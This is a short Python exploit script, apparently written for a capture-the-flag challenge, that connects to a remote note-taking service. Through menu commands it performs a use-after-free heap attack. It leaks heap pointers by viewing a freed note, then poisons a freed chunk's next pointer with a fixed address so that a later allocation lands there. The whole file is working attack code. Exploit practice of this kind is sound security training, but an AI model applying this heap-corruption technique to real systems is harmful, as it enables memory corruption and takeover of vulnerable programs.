import re
import socket
import struct
import sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "pwn.h7tex.com", 42589
s = socket.create_connection((HOST, PORT), timeout=15)


def rd(t=0.8, label=""):
    s.settimeout(t)
    buf = b""
    while True:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    print("[%s] %d bytes: %r" % (label, len(buf), buf[:200]))
    return buf


def send(x, label=""):
    s.sendall(x if isinstance(x, bytes) else x.encode())
    return rd(0.8, label)


rd(1.5, "banner")
send("1\n"); send("0\n", "add0-idx"); send(b"AAAA" + b"\x00" * 4, "add0-note")
send("1\n"); send("1\n", "add1-idx"); send(b"BBBB" + b"\x00" * 4, "add1-note")
send("2\n"); send("0\n", "del0")
leak = send("4\n"); leak = send("0\n", "view0")
print("first 32 bytes:", leak[:32].hex())
if len(leak) >= 16:
    print("q0=0x%x  q1=0x%x" % (struct.unpack("<QQ", leak[:16])))
send("2\n"); send("1\n", "del1")
send("3\n"); send("1\n", "edit1-idx")
send(struct.pack("<Q", 0x404060), "edit1-payload")
send("1\n"); send("2\n", "add2")
send("1\n"); send("3\n", "add3")
s.close()
